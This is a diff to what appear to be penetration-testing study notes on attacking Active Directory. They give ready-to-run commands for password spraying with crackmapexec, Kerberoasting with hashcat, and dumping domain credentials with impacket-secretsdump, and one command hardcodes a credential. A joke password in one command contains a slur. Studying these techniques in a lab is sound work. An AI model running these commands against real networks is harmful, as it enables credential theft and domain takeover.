@@ -22,7 +22,7 @@
     - DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1 #NoFullAutoInTheBuilding! 🔫🔫🔫🔫🔫🔫
 2. SMB (Nois & slow)
     - Run in Kali Env
-    - ``` crackmapexec smb {victim ip} -u users.txt -p 'YouAreFuckingGay' -d corp.com --continue-on-success ``` 
+    - ``` crackmapexec smb {victim ip} -u users.txt -p 'YouAreFuckingGay' -d corp.com (--continue-on-success OR --shares) ``` 
     - If have local admin rights of that ac will show "Pwd3d!"
 3. Kerberos TGT
     - Run in Windows/ Kali
@@ -41,6 +41,7 @@
 3. hashcat 
 
 ## Kerberoast (TGS-REP)
+- Target service accounts
 - The service ticket is encrypted using the SPN's password hash.
 - m=13100 hashcat
 - Linux (kali way)
@@ -77,10 +78,3 @@
 - Linux (Kali way)
 1. ``` impacket-secretsdump -just-dc-user {target user to get} corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@{dc_ip} ```
 
-
-
-## Useful things
-1. Run As Admin
-    https://github.com/antonioCoco/RunasCs 
-
-2.
